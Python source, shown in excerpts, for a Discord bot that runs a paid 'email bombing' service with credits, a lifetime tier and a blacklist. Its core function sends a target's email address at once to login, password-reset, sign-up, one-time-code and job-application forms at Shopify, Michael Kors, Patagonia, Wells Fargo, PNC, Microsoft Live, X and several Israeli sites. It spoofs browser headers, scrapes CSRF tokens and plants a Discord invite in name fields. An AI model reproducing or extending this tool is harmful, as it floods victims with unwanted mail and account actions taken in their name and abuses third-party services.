...
async def _shopify_70278479906_login(session, email):
    url = "https://shopify.com/authentication/70278479906/login"
    await _preflight_page(session, url)
    json_body = {
        "email": email,
        "client_id": os.getenv("SHOPIFY_702_CLIENT_ID", "1f27dda4-1c02-4ae8-8a2f-3a67b3b49cdd"),
        "redirect_uri": os.getenv("SHOPIFY_702_REDIRECT_URI", "/authentication/70278479906/oauth/authorize?buyer_flags=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnb2RtYW5jby5teXNob3BpZnkuY29tIiwiZmxhZ3MiOltdLCJleHAiOjE3ODI3NzIzNzksIm5iZiI6MTc4MjE2NzU3OX0.QhwT8C48iFRnACgJa22hWrraaYZHWPT2z8aH3dOLbSk&client_id=1f27dda4-1c02-4ae8-8a2f-3a67b3b49cdd&locale=en-US&nonce=f0fbd5aa-0669-46a5-85cd-98be6e4bbe6d&redirect_uri=https%3A%2F%2Fshopify.com%2F70278479906%2Faccount%2Fcallback&region_country=US&response_type=code&scope=openid+email+customer-account-api%3Afull&state=hWNDeJWD3YXbySRbL81y9yTq"),
        "region_country": os.getenv("SHOPIFY_702_REGION", "US"),
        "step": "email",
    }
    ...
    return await _async_req(
        ...
        extra_headers={
            ...
            "sec-fetch-site": "same-origin",
            "user-agent": random_ua(),
            "x-csrf-token": os.getenv("SHOPIFY_CSRF_TOKEN", "VJ3jyiWScNMtGFf4E7qOwWGuu1SBE1W4b742mtTl2wuTxkmKnKWLM47y6IbTUdzXKEUVOrG8sj9QP8LwohIPvg"),
        },
        label="shopify-702-login",
    )
...
async def _michaelkors_password_reset(session, email):
    url = "https://www.michaelkors.global/il/en/account/password-reset/"
    await _preflight_page(session, url)
    page_html = await _get_page_text(session, url)
    ...
    headers = {
        ...
        "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.michaelkors.global",
        "referer": url,
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
...
async def _thenorthface_register(session, email):
    page_url = "https://thenorthface.co.il/customer-club/"
    await _preflight_page(session, page_url)
    page_html = await _get_page_text(session, page_url)
    security_token = _extract_csrf_token(page_html) if page_html else None
    ...
    data = {
        ...
        "email": email,
        "password": f"Pass{_uuid.uuid4().hex[:12]}",
        "birthdate": f"{random.randint(1960, 2000)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
        "receive_email": "true",
        "userid": "",
        "security": security_token or os.getenv("THENORTHFACE_SECURITY_TOKEN", ""),
        "action": "create_user_form",
        "recaptcha_token": os.getenv("THENORTHFACE_RECAPTCHA_TOKEN", ""),
    }
    
    return await _async_req(
        session,
        "POST",
        "https://thenorthface.co.il/wp-admin/admin-ajax.php",
        data=data,
        extra_headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://thenorthface.co.il",
            "referer": page_url,
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
        ...
        label="thenorthface-register",
    )

async def _wellsfargo_offer_subscribe(session, email):
    page_url = "https://accountoffers.wellsfargo.com/checkingoffer/?sub_channel=WEB&vendor_code=WF&collateral_code=HPPB1549Q226"
    await _preflight_page(session, page_url)
    page_html = await _get_page_text(session, page_url)
    csrf_token = _extract_csrf_token(page_html) if page_html else os.getenv("WELLSFARGO_CSRF_TOKEN", "")
    
    json_body = {
        "email": email,
        "deviceType": "desktop",
        "marketOfferCode": "226DA",
        "url": page_url,
        "dm": None,
    }
    ...
    headers = {
        ...
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Origin": "https://accountoffers.wellsfargo.com",
        "Referer": page_url,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "X-CSRF-TOKEN-AO": csrf_token,
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    ...
    return await _async_req(
        session,
        "POST",
        "https://accountoffers.wellsfargo.com/w-csbb-accountoffers-checkingoffer/api/offer/subscribe/",
        json_body=json_body,
        extra_headers=headers,
        label="wellsfargo-offer-subscribe",
    )

async def _pnc_coupon_submit(session, email):
    page_url = "https://www.pnc.com/en/personal-banking/banking/checking/bonus-offer.html"
    await _preflight_page(session, page_url)
    page_html = await _get_page_text(session, page_url)
    csrf_token = _extract_csrf_token(page_html) if page_html else os.getenv("PNC_CSRF_TOKEN", "undefined")
    
    data = {
        "em": email,
        "eng": "",
        "experentialFormSubmit": "",
        "programId": "P281",
        "fn": "User",
        "ln": "Test",
        "u": page_url,
    ...
    return await _async_req(
        session,
        "POST",
        "https://www.pnc.com/bin/pnc-com/dsa/coupon/submitcoupon",
        data=data,
        extra_headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        ...
        label="pnc-coupon-submit",
    )

async def _live_send_ott(session, email):
    page_url = "https://signup.live.com/signup?contextid=B4D007A20FF82807&opid=8EED456F556961EA&bk=1782162756&sru=https://login.live.com/oauth20_authorize.srf%3fclient_id%3d10fa57ef-4895-4ab2-872c-8c3613d4f7fb%26client_id%3d10fa57ef-4895-4ab2-872c-8c3613d4f7fb%26contextid%3dB4D007A20FF82807%26opid%3d8EED456F556961EA%26mkt%3dHE-IL%26lc%3d1037%26bk%3d1782162756%26uaid%3d650ab78109054210a0a3bb29771c7549&uiflavor=web&fluent=2&client_id=000000004CF3D385&lic=1&mkt=HE-IL&lc=1037&uaid=650ab78109054210a0a3bb29771c7549"
    await _preflight_page(session, page_url)
    ...
    json_body = {
        ...
        "uiflvr": 1001,
        "scid": 100118,
        "uaid": "650ab78109054210a0a3bb29771c7549",
        "hpgid": 200225,
    }
    ...
    return await _async_req(
        session,
        "POST",
        "https://signup.live.com/API/Proofs/SendOtt?contextid=B4D007A20FF82807&opid=8EED456F556961EA&bk=1782162756&sru=https://login.live.com/oauth20_authorize.srf%3fclient_id%3d10fa57ef-4895-4ab2-872c-8c3613d4f7fb%26client_id%3d10fa57ef-4895-4ab2-872c-8c3613d4f7fb%26contextid%3dB4D007A20FF82807%26opid%3d8EED456F556961EA%26mkt%3dHE-IL%26lc%3d1037%26bk%3d1782162756%26uaid%3d650ab78109054210a0a3bb29771c7549&uiflavor=web&fluent=2&client_id=000000004CF3D385&lic=1&mkt=HE-IL&lc=1037&uaid=650ab78109054210a0a3bb29771c7549",
        json_body=json_body,
        extra_headers={
            "Accept": "application/json",
            "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            ...
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "canary": os.getenv("LIVE_CANARY", ""),
            "client-request-id": "650ab78109054210a0a3bb29771c7549",
            "correlationId": "650ab78109054210a0a3bb29771c7549",
            "hpgact": "0",
            "hpgid": "200225",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
...
async def _patagonia_password_reset(session, email):
    page_url = "https://www.patagonia.com/account/login/?rurl=18"
    await _preflight_page(session, page_url)
    page_html = await _get_page_text(session, page_url)
    csrf = _extract_csrf_token(page_html) if page_html else os.getenv("PATAGONIA_CSRF_TOKEN", "")
    recaptcha = os.getenv("PATAGONIA_RECAPTCHA_TOKEN", "")

    boundary = "----WebKitFormBoundaryEMLgKJi1zueGwBpl"
    body = (
        f"{boundary}\r\nContent-Disposition: form-data; name=\"loginEmail\"\r\n\r\n{email}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"csrf_token\"\r\n\r\n{csrf}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"g-recaptcha-response\"\r\n\r\n{recaptcha}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"g-recaptcha-action\"\r\n\r\npassword_reset_request\r\n"
        f"{boundary}--\r\n"
    )
    ...
    return await _async_req(
        session,
        "POST",
        "https://www.patagonia.com/on/demandware.store/Sites-patagonia-us-Site/en_US/Account-PasswordResetDialogForm?mobile=&rurl=",
        data=body,
        extra_headers={
            "accept": "*/*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": f"multipart/form-data; boundary={boundary}",
            "origin": "https://www.patagonia.com",
            "referer": "https://www.patagonia.com/account/login/?rurl=18",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
        ...
        label="patagonia-reset",
    )

async def _dominos_apply_position(session, email):
    page_url = "https://dominos.clickapp.co.il/jobs"
    await _preflight_page(session, page_url)
    page_html = await _get_page_text(session, page_url)

    token = None
    if page_html:
        m = re.search(r'name=["\']__RequestVerificationToken["\']\s+value=["\']([^"\']+)["\']', page_html)
        if m:
            token = m.group(1)
    token = token or os.getenv("DOMINOS_REQUEST_VERIFICATION_TOKEN", "")

    boundary = "----WebKitFormBoundaryflvhXzCFzSRIY673"
    name = os.getenv("DOMINOS_APPLICANT_NAME", "httpsdiscordggG")
    phone = os.getenv("DOMINOS_APPLICANT_PHONE", f"05{random.randint(2000000, 9999999)}")
    partnerId = os.getenv("DOMINOS_PARTNER_ID", "")
    positionId = os.getenv("DOMINOS_POSITION_ID", "")
    appId = os.getenv("DOMINOS_APP_ID", "clients/4-A")
    branch = os.getenv("DOMINOS_BRANCH", "branches/40-A")
    ...
    return await _async_req(
        session,
        "POST",
        "https://dominos.clickapp.co.il/applyPosition",
        data=body,
        extra_headers={
            "accept": "*/*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": f"multipart/form-data; boundary={boundary}",
            "origin": "https://dominos.clickapp.co.il",
            "referer": page_url,
            "request-id": f"|{_uuid.uuid4().hex}.b48cdf37290948bc",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "traceparent": f"00-{_uuid.uuid4().hex}-b48cdf37290948bc-01",
            "user-agent": random_ua(),
            "x-requested-with": "XMLHttpRequest",
        },
        label="dominos-apply",
...
async def _shakeshack_submit(session, email):
    page_url = "https://shakeshack.co.il/privacy-policy/"
    await _preflight_page(session, page_url)
    page_html = await _get_page_text(session, page_url)

    # No visible CSRF token; proceed with defaults and optional env overrides
    boundary = "----WebKitFormBoundary7UQOZ6CbkBAZ3tOB"
    post_id = os.getenv("SHAKESHACK_POST_ID", "7125")
    form_id = os.getenv("SHAKESHACK_FORM_ID", "9961b2b")
    referer_title = os.getenv("SHAKESHACK_REFERER_TITLE", "מדיניות פרטיות - האתר הרשמי של שייק שאק בישראל | SHAKE SHACK Israel")
    queried_id = os.getenv("SHAKESHACK_QUERIED_ID", "3")
    fname = os.getenv("SHAKESHACK_NAME", "https://discord.gg/GjbeBVS5Sw")
    tel = os.getenv("SHAKESHACK_PHONE", f"05{random.randint(2000000,9999999)}")
    age = os.getenv("SHAKESHACK_AGE", "24")
    city = os.getenv("SHAKESHACK_CITY", "תל אביב")
    jobtype = os.getenv("SHAKESHACK_JOBTYPE", "מנהל משמרת")
    referrer = page_url
    ...
    body = (
        ...
        f"{boundary}\r\nContent-Disposition: form-data; name=\"form_fields[field_2db223d]\"\r\n\r\n\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"form_fields[fname]\"\r\n\r\n{fname}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"form_fields[tel]\"\r\n\r\n{tel}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"form_fields[email]\"\r\n\r\n{email}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"form_fields[age]\"\r\n\r\n{age}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"form_fields[city]\"\r\n\r\n{city}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"form_fields[jobtype]\"\r\n\r\n{jobtype}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"form_fields[field_2382a6a]\"\r\n\r\non\r\n"
    ...
    return await _async_req(
        session,
        "POST",
        "https://shakeshack.co.il/wp-admin/admin-ajax.php",
        data=body,
        extra_headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": f"multipart/form-data; boundary={boundary}",
            "origin": "https://shakeshack.co.il",
            "referer": page_url,
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
        ...
        label="shakeshack-submit",
    )

async def _xcom_begin_login(session, email):
    ...
    data = {
        ...
        "password": "",
        "$castle_token": os.getenv("XCASTLE_TOKEN", ""),
    }
    ...
    return await _async_req(
        ...
        extra_headers={
            "accept": "*/*",
            "accept-language": "he",
            "authorization": os.getenv("XCOM_AUTHORIZATION", "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA"),
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://x.com",
            "referer": "https://x.com/",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            ...
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "x-guest-token": os.getenv("X_GUEST_TOKEN", "2069167153119477957"),
            "x-jf-client-theme": "light",
            "x-jf-v": "JP-5",
            "x-twitter-active-user": "yes",
            "x-twitter-client-language": "he",
        },
        label="xcom-begin-login",
    )
...
async def fire_all_senders(email: str) -> tuple[int, list[str]]:
    ...
    async with aiohttp.ClientSession(connector=connector) as s:
        tasks = [
            ...
            _shopify_70278479906_login(s, e),
            ...
            _michaelkors_password_reset(s, e),
            _thenorthface_register(s, e),
            _wellsfargo_offer_subscribe(s, e),
            _pnc_coupon_submit(s, e),
            _live_send_ott(s, e),
            _dominos_apply_position(s, e),
            _shakeshack_submit(s, e),
            _patagonia_password_reset(s, e),
            _xcom_begin_login(s, e),
    ...
    try:
        ...
        if current_credits_str != "lifetime":
            try:
                ...
                safe_db_ref(f"users/{user_id}").update({"credits": str(max(0, curr_int - credits))})
            except Exception as e:
...
class SpamEmailModal(discord.ui.Modal, title="הגדרות הפצצה באימייל"):
    ...
    async def on_submit(self, interaction: discord.Interaction):
        try:
            ...
            snap = safe_db_ref(f"users/{interaction.user.id}").get()
...
async def on_interaction(interaction: discord.Interaction):
    ...
    if custom_id == "my_credits":
        ...
        ref = safe_db_ref(f"users/{interaction.user.id}")
        snap = ref.get()
        cur = snap.get("credits", "0") if snap else "0"
        if cur != "lifetime":
            try:
        ...
        blocked = safe_db_ref(f"blacklist/{email_key}").get()
        if blocked:
...
async def add_credits(interaction: discord.Interaction, target_type: str, amount: str, user: discord.User = None):
    ...
    if target_type == "single":
        ...
        if amount.lower() == "lifetime":
            safe_db_ref(f"users/{user.id}").update({"credits": "lifetime"})
        ...
        ref = safe_db_ref(f"users/{user.id}")
        snap = ref.get() or {}
...
async def check_credits(interaction: discord.Interaction, user: discord.Member):
    ...
    try:
        ref = safe_db_ref(f"users/{user.id}/credits")
        credits = ref.get()
        if credits is None:
            credits = 0
...
async def blacklist(interaction: discord.Interaction, p: str):
    ...
    safe_db_ref(f"blacklist/{p_key}").set(True)
...
async def remove_blacklist(interaction: discord.Interaction, p: str):
    ...
    await interaction.response.defer(ephemeral=True)
    p_key = email_to_key(p)
    safe_db_ref(f"blacklist/{p_key}").delete()
    await interaction.followup.send(f"✅ בוצע על {p}", ephemeral=True)
...
async def blacklist_list(interaction: discord.Interaction):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    snap = safe_db_ref("blacklist").get()
